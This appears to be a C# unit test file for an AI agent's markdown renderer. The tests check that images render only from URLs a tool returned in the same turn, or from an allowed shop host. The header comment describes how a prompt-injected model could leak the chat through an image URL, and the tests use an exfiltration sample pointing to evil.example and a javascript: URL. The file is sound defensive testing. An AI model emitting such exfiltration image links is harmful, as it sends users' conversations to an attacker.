using System.Text.RegularExpressions;
using LouisAgent.Web.Shared.Text;

namespace LouisAgent.Web.Shared.Tests.Text;

// FX22: an image renders when its exact URL came back in a tool result of the same turn (the set the page passes), whatever its host. A model can't invent a
// URL that passes, so a tricked model can't send the chat to a host by writing an image. A shop's host still renders without the set (ImageHosts, F33).
public class MarkdownProvenanceTests
{
    private const string Url = "https://example.co.za/wp-content/bobotie.jpg";
    private static readonly IReadOnlySet<string> Shown = new HashSet<string> { Url };

    private static string Html(string markdown, IReadOnlySet<string>? shown) => Markdown.ToHtml(markdown, shown).Value;

    [Test]
    public void AnImageInTheSet_RendersAsAnImage()
    {
        string html = Html($"![Bobotie]({Url})", Shown);

        Assert.That(html, Does.Contain("<img").And.Contain($"src=\"{Url}\""));
    }

    [Test]
    public void AnImageNotInTheSet_IsALink()
    {
        string html = Html("![Bobotie](https://example.co.za/other.jpg)", Shown);

        Assert.That(html, Does.Not.Contain("<img").And.Contain("<a href=\"https://example.co.za/other.jpg\">"));
    }

    [Test]
    public void AUrlThatDiffersOnlyByAQueryParameter_IsNotInTheSet() =>
        Assert.That(Html($"![Bobotie]({Url}?x=1)", Shown), Does.Not.Contain("<img"), "exact match, not a prefix or a host");

    [Test]
    public void AShopHostsImage_StillRenders_WithAnEmptySet_ANullSet_OrNone()
    {
        string markdown = "![KOO](https://catalog.sixty60.co.za/a/b.jpg)";

        Assert.That(Html(markdown, new HashSet<string>()), Does.Contain("<img"));
        Assert.That(Html(markdown, null), Does.Contain("<img"));
        Assert.That(Markdown.ToHtml(markdown).Value, Does.Contain("<img"));
    }

    [Test]
    public void ANullSet_BehavesAsToday_AnotherHostIsALink() =>
        Assert.That(Html($"![Bobotie]({Url})", null), Does.Not.Contain("<img"));

    [Test]
    public void TheExfiltrationCase_AnImageWhoseUrlCarriesTheChat_RendersNoImgElement()
    {
        string html = Html("![x](https://evil.example/?q=the+chat) en ![Bobotie](" + Url + ")", Shown);

        Assert.That(Regex.Matches(html, "<img").Count, Is.EqualTo(1), "only the image a tool gave");
        Assert.That(html, Does.Not.Contain("<img src=\"https://evil.example"));
    }

    [Test]
    public void AnUnsafeUrl_IsStillNeverAnImage() =>
        Assert.That(Html("![x](javascript:alert(1))", new HashSet<string> { "javascript:alert(1)" }), Does.Not.Contain("<img").And.Not.Contain("javascript:"));
}
